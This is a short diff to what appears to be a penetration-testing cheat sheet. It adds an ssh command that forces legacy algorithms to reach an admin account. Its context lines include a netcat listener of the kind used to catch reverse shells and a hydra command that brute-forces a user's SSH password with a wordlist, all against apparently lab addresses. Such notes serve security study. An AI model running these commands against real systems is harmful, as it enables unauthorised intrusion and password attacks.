@@ -65,6 +65,13 @@ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa bob
 
 nc -nvlp 443
 ````
+###### no matching key exchange method found.
+````
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
+ -oHostKeyAlgorithms=+ssh-rsa\
+ -oCiphers=+aes256-cbc\
+ admin@10.11.1.252 -p 22000
+````
 ````
 hydra -l megan -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
 ````
